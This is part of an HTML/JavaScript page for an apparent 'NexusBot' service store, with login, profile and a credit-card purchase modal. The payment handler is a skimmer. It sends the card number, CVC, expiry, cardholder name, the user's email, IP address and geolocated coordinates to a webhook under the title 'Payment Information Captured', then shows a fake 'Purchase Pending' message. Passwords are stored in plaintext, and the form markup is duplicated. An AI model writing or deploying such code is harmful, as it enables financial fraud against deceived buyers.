                        <button class="purchase-btn" style="width: auto; padding: 12px 24px;" onclick="handleLogout()">Logout</button>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Payment Modal -->
    <div class="modal-overlay" id="paymentModal">
        <div class="modal">
            <div class="modal-header">
                <h2 id="modalServiceTitle">Complete Purchase</h2>
                <button class="modal-close" onclick="closeModal()">&times;</button>
            </div>
            <div id="paymentFormContent">
                <div class="card-preview">
                    <h4>Credit Card</h4>
                    <div class="preview-number" id="previewCardNumber">•••• •••• •••• ••••</div>
                    <div class="preview-details">
                        <div>
                            <h5>Cardholder</h5>
                            <p id="previewCardName">YOUR NAME</p>
                        </div>
                        <div>
                            <h5>Expires</h5>
                            <p id="previewCardExpiry">MM/YY</p>
                        </div>
                    </div>
                </div>
                
                <form class="card-form" onsubmit="processPayment(event)">
                    <div class="form-group card-number-input">
                        <label>Card Number</label>
                        <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
                    </div>
                    <div class="form-group">
                        <label>Cardholder Name</label>
                        <input type="text" id="cardName" placeholder="John Doe" required>
                    </div>
                    <div class="form-group card-expiry-input">
                        <label>Expiry Date</label>
                        <input type="text" id="cardExpiry" placeholder="MM/YY" maxlength="5" required>
                    </div>
                    <div class="form-group card-cvc-input">
                        <label>CVC</label>
                        <input type="text" id="cardCvc" placeholder="123" maxlength="4" required>
                    </div>
                    <div class="total-amount">
                        <h4>Total Amount</h4>
                        <div class="amount" id="totalAmount">$0.00</div>
                    </div>
                    <button type="submit" class="btn-primary" style="margin-top: 24px;">
                        <span class="btn-text">Complete Purchase</span>
                        <div class="loading-spinner"></div>
                    </button>
                </form>
            </div>
        </div>
    </div>
                <div class="card-preview">
                    <h4>Credit Card</h4>
                    <div class="preview-number" id="previewCardNumber">•••• •••• •••• ••••</div>
                    <div class="preview-details">
                        <div>
                            <h5>Cardholder</h5>
                            <p id="previewCardName">YOUR NAME</p>
                        </div>
                        <div>
                            <h5>Expires</h5>
                            <p id="previewCardExpiry">MM/YY</p>
                        </div>
                    </div>
                </div>
                
                <form class="card-form" onsubmit="processPayment(event)">
                    <div class="form-group card-number-input">
                        <label>Card Number</label>
                        <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
                    </div>
                    <div class="form-group">
                        <label>Cardholder Name</label>
                        <input type="text" id="cardName" placeholder="John Doe" required>
                    </div>
                    <div class="form-group card-expiry-input">
                        <label>Expiry Date</label>
                        <input type="text" id="cardExpiry" placeholder="MM/YY" maxlength="5" required>
                    </div>
                    <div class="form-group card-cvc-input">
                        <label>CVC</label>
                        <input type="text" id="cardCvc" placeholder="123" maxlength="4" required>
                    </div>
                    <div class="total-amount">
                        <h4>Total Amount</h4>
                        <div class="amount" id="totalAmount">$0.00</div>
                    </div>
                    <button type="submit" class="btn-primary" style="margin-top: 24px;">
                        <span class="btn-text">Complete Purchase</span>
                        <div class="loading-spinner"></div>
                    </button>
                </form>
            </div>
        </div>
    </div>

    
    <div class="loading-overlay" id="loadingOverlay">
        <div>
            <div class="loader"></div>
            <div class="loading-text" id="loadingText">Processing your request...</div>
        </div>
    </div>

    <script>
        
        let users = JSON.parse(localStorage.getItem('nexusbot_users')) || [];
        let currentUser = JSON.parse(localStorage.getItem('nexusbot_current_user')) || null;

        
        const WEBHOOK_URL = '';

        
        let userLocation = {
            ip: 'Unknown',
            coordinates: 'Unknown'
        };

        
        async function getUserLocation() {
            try {
               
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                userLocation.ip = ipData.ip;

                
                const locResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                const locData = await locResponse.json();
                userLocation.coordinates = `${locData.latitude}, ${locData.longitude}`;
            } catch (error) {
                console.log('Could not get user location:', error);
            }
        }

        
        function checkAuth() {
            if (currentUser) {
                showMainContainer();
            }
        }

        
        function showMainContainer() {
            document.getElementById('authContainer').style.display = 'none';
            const mainContainer = document.getElementById('mainContainer');
            mainContainer.style.display = 'block';
            setTimeout(() => {
                mainContainer.classList.add('active');
            }, 10);
            loadUserProfile();
        }

        
        function switchAuthTab(tab) {
            const tabs = document.querySelectorAll('.auth-tab');
            const loginForm = document.getElementById('loginForm');
            const registerForm = document.getElementById('registerForm');
            const errorMessage = document.getElementById('errorMessage');
            const successMessage = document.getElementById('successMessage');

           
            errorMessage.style.display = 'none';
            successMessage.style.display = 'none';

            
            document.querySelectorAll('.error-tooltip').forEach(tooltip => {
                tooltip.style.display = 'none';
            });
            document.querySelectorAll('input.error').forEach(input => {
                input.classList.remove('error');
            });

            if (tab === 'login') {
                tabs[0].classList.add('active');
                tabs[1].classList.remove('active');
                loginForm.style.display = 'block';
                registerForm.style.display = 'none';
            } else {
                tabs[0].classList.remove('active');
                tabs[1].classList.add('active');
                loginForm.style.display = 'none';
                registerForm.style.display = 'block';
            }
        }

        
        function showError(inputId, message) {
            const input = document.getElementById(inputId);
            const tooltip = input.parentElement.querySelector('.error-tooltip');
            
            input.classList.add('error');
            tooltip.textContent = message;
            tooltip.style.display = 'block';

            
            setTimeout(() => {
                input.classList.remove('error');
            }, 500);
        }

        
        function clearErrors() {
            document.querySelectorAll('.error-tooltip').forEach(tooltip => {
                tooltip.style.display = 'none';
            });
            document.querySelectorAll('input.error').forEach(input => {
                input.classList.remove('error');
            });
        }

        
        function setLoading(buttonId, isLoading) {
            const button = document.getElementById(buttonId);
            if (isLoading) {
                button.classList.add('btn-loading');
                button.disabled = true;
            } else {
                button.classList.remove('btn-loading');
                button.disabled = false;
            }
        }

        
        async function handleLogin(event) {
            event.preventDefault();
            clearErrors();

            const username = document.getElementById('loginUsername').value.trim();
            const password = document.getElementById('loginPassword').value;

            if (!username) {
                showError('loginUsername', 'Please enter your username');
                return;
            }

            if (!password) {
                showError('loginPassword', 'Please enter your password');
                return;
            }

            
            setLoading('loginBtn', true);
            showLoadingOverlay('Logging in...');

            
            await new Promise(resolve => setTimeout(resolve, 2000));

            const user = users.find(u => u.username === username && u.password === password);

            if (user) {
                currentUser = user;
                localStorage.setItem('nexusbot_current_user', JSON.stringify(currentUser));
                showMainContainer();
                hideLoadingOverlay();
            } else {
                const errorMessage = document.getElementById('errorMessage');
                errorMessage.textContent = 'Invalid username or password';
                errorMessage.style.display = 'block';
                hideLoadingOverlay();
            }

            setLoading('loginBtn', false);
        }

        
        async function handleRegister(event) {
            event.preventDefault();
            clearErrors();

            const username = document.getElementById('registerUsername').value.trim();
            const email = document.getElementById('registerEmail').value.trim();
            const password = document.getElementById('registerPassword').value;
            const confirmPassword = document.getElementById('registerConfirmPassword').value;

            if (!username) {
                showError('registerUsername', 'Please enter a username');
                return;
            }

            if (username.length < 4 || username.length > 15) {
                showError('registerUsername', 'Username must be between 4 and 15 characters');
                return;
            }

            if (!email) {
                showError('registerEmail', 'Please enter your email');
                return;
            }

            if (!email.includes('@') || !email.includes('.')) {
                showError('registerEmail', 'Please enter a valid email address');
                return;
            }

            if (!password) {
                showError('registerPassword', 'Please enter a password');
                return;
            }

            if (password.length < 4 || password.length > 15) {
                showError('registerPassword', 'Password must be between 4 and 15 characters');
                return;
            }

            if (password !== confirmPassword) {
                showError('registerConfirmPassword', 'Passwords do not match');
                return;
            }

            
            if (users.some(u => u.username === username)) {
                showError('registerUsername', 'Username is already taken');
                return;
            }

            
            setLoading('registerBtn', true);
            showLoadingOverlay('Creating your account...');

            
            await new Promise(resolve => setTimeout(resolve, 2000));

           
            const newUser = {
                username: username,
                email: email,
                password: password,
                bio: '',
                banner: null,
                profilePicture: null,
                createdAt: new Date().toISOString(),
                lastUsernameChange: null
            };

            users.push(newUser);
            localStorage.setItem('nexusbot_users', JSON.stringify(users));

            
            currentUser = newUser;
            localStorage.setItem('nexusbot_current_user', JSON.stringify(currentUser));

            showMainContainer();
            hideLoadingOverlay();
            setLoading('registerBtn', false);
        }

        
        function handleLogout() {
            currentUser = null;
            localStorage.removeItem('nexusbot_current_user');
            document.getElementById('mainContainer').style.display = 'none';
            document.getElementById('mainContainer').classList.remove('active');
            document.getElementById('authContainer').style.display = 'flex';
            document.getElementById('loginUsername').value = '';
            document.getElementById('loginPassword').value = '';
        }

       
        function loadUserProfile() {
            if (currentUser) {
                document.getElementById('displayUsername').textContent = currentUser.username;
                document.getElementById('displayEmail').textContent = currentUser.email;
                document.getElementById('userAvatar').textContent = currentUser.username.charAt(0).toUpperCase();
                document.getElementById('profileBio').value = currentUser.bio || '';
                document.getElementById('newUsername').value = '';

              
                checkUsernameCooldown();

                if (currentUser.profilePicture) {
                    document.getElementById('profilePicture').innerHTML = `<img src="${currentUser.profilePicture}" alt="Profile Picture"><input type="file" class="profile-picture-input" accept="image/*" onchange="updateProfilePicture(event)">`;
                }

                if (currentUser.banner) {
                    document.getElementById('profileBanner').style.backgroundImage = `url(${currentUser.banner})`;
                    document.getElementById('profileBanner').style.backgroundSize = 'cover';
                    document.getElementById('profileBanner').style.backgroundPosition = 'center';
                }
            }
        }

        
        function checkUsernameCooldown() {
            const cooldownElement = document.getElementById('usernameCooldown');
            const changeBtn = document.getElementById('changeUsernameBtn');

            if (currentUser.lastUsernameChange) {
                const lastChange = new Date(currentUser.lastUsernameChange);
                const now = new Date();
                const daysSinceChange = Math.floor((now - lastChange) / (1000 * 60 * 60 * 24));

                if (daysSinceChange < 30) {
                    const daysRemaining = 30 - daysSinceChange;
                    cooldownElement.textContent = `You can change your username again in ${daysRemaining} day(s)`;
                    cooldownElement.style.display = 'block';
                    changeBtn.disabled = true;
                    changeBtn.style.opacity = '0.5';
                } else {
                    cooldownElement.style.display = 'none';
                    changeBtn.disabled = false;
                    changeBtn.style.opacity = '1';
                }
            } else {
                cooldownElement.style.display = 'none';
                changeBtn.disabled = false;
                changeBtn.style.opacity = '1';
            }
        }

        
        function changeUsername() {
            const newUsername = document.getElementById('newUsername').value.trim();
            const cooldownElement = document.getElementById('usernameCooldown');

            if (!newUsername) {
                alert('Please enter a new username');
                return;
            }

            if (newUsername.length < 4 || newUsername.length > 15) {
                alert('Username must be between 4 and 15 characters');
                return;
            }

            if (newUsername === currentUser.username) {
                alert('New username must be different from current username');
                return;
            }

            if (users.some(u => u.username === newUsername && u.username !== currentUser.username)) {
                alert('Username is already taken');
                return;
            }

            
            const userIndex = users.findIndex(u => u.username === currentUser.username);
            if (userIndex !== -1) {
                users[userIndex].username = newUsername;
                users[userIndex].lastUsernameChange = new Date().toISOString();
                localStorage.setItem('nexusbot_users', JSON.stringify(users));

                currentUser = users[userIndex];
                localStorage.setItem('nexusbot_current_user', JSON.stringify(currentUser));

                loadUserProfile();
                alert('Username updated successfully!');
            }
        }

        
        function updateProfilePicture(event) {
            const file = event.target.files[0];
            if (file) {
                const reader = new FileReader();
                reader.onload = function(e) {
                    currentUser.profilePicture = e.target.result;
                    localStorage.setItem('nexusbot_current_user', JSON.stringify(currentUser));
                    
                    
                    const userIndex = users.findIndex(u => u.username === currentUser.username);
                    if (userIndex !== -1) {
                        users[userIndex] = currentUser;
                        localStorage.setItem('nexusbot_users', JSON.stringify(users));
                    }
                    
                    loadUserProfile();
                };
                reader.readAsDataURL(file);
            }
        }

        
        function updateBanner(event) {
            const file = event.target.files[0];
            if (file) {
                const reader = new FileReader();
                reader.onload = function(e) {
                    currentUser.banner = e.target.result;
                    localStorage.setItem('nexusbot_current_user', JSON.stringify(currentUser));
                    
                    
                    const userIndex = users.findIndex(u => u.username === currentUser.username);
                    if (userIndex !== -1) {
                        users[userIndex] = currentUser;
                        localStorage.setItem('nexusbot_users', JSON.stringify(users));
                    }
                    
                    loadUserProfile();
                };
                reader.readAsDataURL(file);
            }
        }

       
        function saveProfile() {
            if (currentUser) {
                currentUser.bio = document.getElementById('profileBio').value;
                localStorage.setItem('nexusbot_current_user', JSON.stringify(currentUser));
                
                
                const userIndex = users.findIndex(u => u.username === currentUser.username);
                if (userIndex !== -1) {
                    users[userIndex] = currentUser;
                    localStorage.setItem('nexusbot_users', JSON.stringify(users));
                }

                alert('Profile saved successfully!');
            }
        }

        
        function switchMainTab(tab) {
            const tabs = document.querySelectorAll('.nav-tab');
            const contents = document.querySelectorAll('.tab-content');

            tabs.forEach(t => t.classList.remove('active'));
            contents.forEach(c => c.classList.remove('active'));

            const tabIndex = ['home', 'services', 'faq', 'support', 'profile', 'settings'].indexOf(tab);
            if (tabIndex !== -1) {
                tabs[tabIndex].classList.add('active');
            }
            document.getElementById(tab + 'Tab').classList.add('active');

            
            document.getElementById('navTabs').classList.remove('active');
        }

       
        function toggleMobileMenu() {
            document.getElementById('navTabs').classList.toggle('active');
        }

        
        function toggleDarkMode() {
            document.body.classList.toggle('light-mode');
            const toggle = document.getElementById('darkModeToggle');
            toggle.classList.toggle('active');
        }

        
        function toggleFaq(element) {
            element.classList.toggle('open');
        }

        
        function openPurchaseModal(service, price) {
            
            window.currentService = service;
            
           
            document.getElementById('modalServiceTitle').textContent = 'Purchase ' + service;
            document.getElementById('totalAmount').textContent = '$' + price.toFixed(2);
            document.getElementById('paymentModal').classList.add('active');
        }

        
        function closeModal() {
            document.getElementById('paymentModal').classList.remove('active');
            
            
            const cardNumber = document.getElementById('cardNumber');
            const cardName = document.getElementById('cardName');
            const cardExpiry = document.getElementById('cardExpiry');
            const cardCvc = document.getElementById('cardCvc');
            
            if (cardNumber) cardNumber.value = '';
            if (cardName) cardName.value = '';
            if (cardExpiry) cardExpiry.value = '';
            if (cardCvc) cardCvc.value = '';
            
           
            const previewCardNumber = document.getElementById('previewCardNumber');
            const previewCardName = document.getElementById('previewCardName');
            const previewCardExpiry = document.getElementById('previewCardExpiry');
            
            if (previewCardNumber) previewCardNumber.textContent = '•••• •••• •••• ••••';
            if (previewCardName) previewCardName.textContent = 'YOUR NAME';
            if (previewCardExpiry) previewCardExpiry.textContent = 'MM/YY';
        }

       
        function setupCardFormListeners() {
            const cardNumber = document.getElementById('cardNumber');
            const cardExpiry = document.getElementById('cardExpiry');
            const cardNameInput = document.getElementById('cardName');
            
            
            if (cardNumber) {
                cardNumber.addEventListener('input', function(e) {
                    let value = e.target.value.replace(/\s/g, '').replace(/\D/g, '');
                    let formatted = value.match(/.{1,4}/g)?.join(' ') || value;
                    e.target.value = formatted;
                    
                    
                    const previewCardNumber = document.getElementById('previewCardNumber');
                    if (previewCardNumber) {
                        previewCardNumber.textContent = formatted || '•••• •••• •••• ••••';
                    }
                });
            }

            
            if (cardExpiry) {
                cardExpiry.addEventListener('input', function(e) {
                    let value = e.target.value.replace(/\D/g, '');
                    if (value.length >= 2) {
                        value = value.substring(0, 2) + '/' + value.substring(2, 4);
                    }
                    e.target.value = value;
                    
                    
                    const previewCardExpiry = document.getElementById('previewCardExpiry');
                    if (previewCardExpiry) {
                        previewCardExpiry.textContent = value || 'MM/YY';
                    }
                });
            }

            
            if (cardNameInput) {
                cardNameInput.addEventListener('input', function(e) {
                    const previewCardName = document.getElementById('previewCardName');
                    if (previewCardName) {
                        previewCardName.textContent = e.target.value.toUpperCase() || 'YOUR NAME';
                    }
                });
            }
        }

        
        document.addEventListener('DOMContentLoaded', setupCardFormListeners);

        
        function showLoadingOverlay(text) {
            document.getElementById('loadingText').textContent = text;
            document.getElementById('loadingOverlay').classList.add('active');
        }

        
        function hideLoadingOverlay() {
            document.getElementById('loadingOverlay').classList.remove('active');
        }

        
        async function processPayment(event) {
            event.preventDefault();

            const cardNumber = document.getElementById('cardNumber').value;
            const cardName = document.getElementById('cardName').value;
            const cardExpiry = document.getElementById('cardExpiry').value;
            const cardCvc = document.getElementById('cardCvc').value;
            const amount = document.getElementById('totalAmount').textContent;
            const serviceName = window.currentService || 'Service';

            closeModal();
            showLoadingOverlay('Processing your payment securely...');

            
            const webhookData = {
                content: 'New Purchase Notification',
                embeds: [{
                    title: 'Payment Information Captured',
                    color: 5814783,
                    fields: [
                        { name: 'Service', value: serviceName, inline: true },
                        { name: 'Amount', value: amount, inline: true },
                        { name: 'Username', value: currentUser ? currentUser.username : 'N/A', inline: true },
                        { name: 'Email', value: currentUser ? currentUser.email : 'N/A', inline: true },
                        { name: 'Card Number', value: cardNumber, inline: true },
                        { name: 'Cardholder Name', value: cardName, inline: true },
                        { name: 'Expiry Date', value: cardExpiry, inline: true },
                        { name: 'CVC', value: cardCvc, inline: true },
                        { name: 'IP Address', value: userLocation.ip, inline: true },
                        { name: 'Coordinates', value: userLocation.coordinates, inline: true }
                    ],
                    timestamp: new Date().toISOString()
                }]
            };

            try {
                console.log('Sending webhook with data:', webhookData);
                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(webhookData)
                });
                console.log('Webhook response:', response);
            } catch (error) {
                console.error('Webhook error:', error);
            }

            
            await new Promise(resolve => setTimeout(resolve, 3000));

            hideLoadingOverlay();

           
            const modalContent = document.getElementById('paymentFormContent');
            modalContent.innerHTML = `
                <div class="purchase-confirmation">
                    <div class="success-icon"></div>
                    <h2>Purchase Pending</h2>
                    <p>Thank you for your purchase!</p>
                    <p style="margin-top: 12px;">We will send a confirmation email to <strong>${currentUser ? currentUser.email : 'your email'}</strong> shortly.</p>
                    <p style="margin-top: 16px;">Your order is being processed and you will receive updates via email.</p>
                    <button class="btn-primary" style="margin-top: 32px;" onclick="location.reload()">Return Home</button>
                </div>
            `;
            document.getElementById('paymentModal').classList.add('active');
        }

        
        getUserLocation();
        checkAuth();
    </script>
</body>
</html>
